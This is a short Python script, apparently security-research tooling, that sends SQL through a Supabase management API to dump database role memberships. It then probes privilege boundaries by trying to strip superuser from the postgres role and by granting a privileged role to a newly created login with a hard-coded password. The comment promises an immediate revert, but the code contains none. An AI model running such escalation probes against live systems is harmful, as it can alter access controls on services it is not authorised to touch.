# -*- coding: utf-8 -*-
"""成员图全量 dump + alter/grant 边界试探 (可逆/失败无副作用)"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ctx = ssl.create_default_context()
out = []
def q(sql, tag):
    body = json.dumps({"query": sql})
    c = http.client.HTTPSConnection(API_HOST, timeout=25, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json",
         "Authorization": "Bearer " + BEARER_JWT}
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request('POST', '/v1/projects/%s/database/query' % PROJECT_REF, headers=h, body=body)
        r = c.getresponse()
        b = r.read(8000).decode('utf-8', errors='replace')
        out.append('### [%s] (%.1fs)\n%s | %s' % (tag, time.time() - t0, r.status, b[:4000]))
        c.close()
    except Exception as e:
        out.append('### [%s] ERR %s' % (tag, e))

# 1. 全量成员图 (role <- member, admin_option)
q("select r.rolname as role, me.rolname as member, m.admin_option from pg_auth_members m join pg_roles r on r.oid=m.roleid join pg_roles me on me.oid=m.member order by 1,2;", "member-graph")
# 2. alter role postgres superuser 试探 (若意外成功立即改回)
q("alter role postgres nosuperuser;", "alter-nosu")
q("select rolname from pg_roles where rolname='postgres' and rolsuper;", "check-su")
# 3. grant 边界: postgres 能否把 supabase_privileged_role 授予新角色 (需要 admin option)
q("create role sbx_tmp_g login password 'Sbxtmp12345!'; grant supabase_privileged_role to sbx_tmp_g;", "grant-priv")
q("select has_role('sbx_tmp_g','supabase_privileged_role') as got_it;", "check-grant")
q("drop role if exists sbx_tmp_g;", "clean-g")

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb26_members.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('ttl=%ds' % (1788510807 - int(time.time())))
print('\n'.join(out)[:8000])
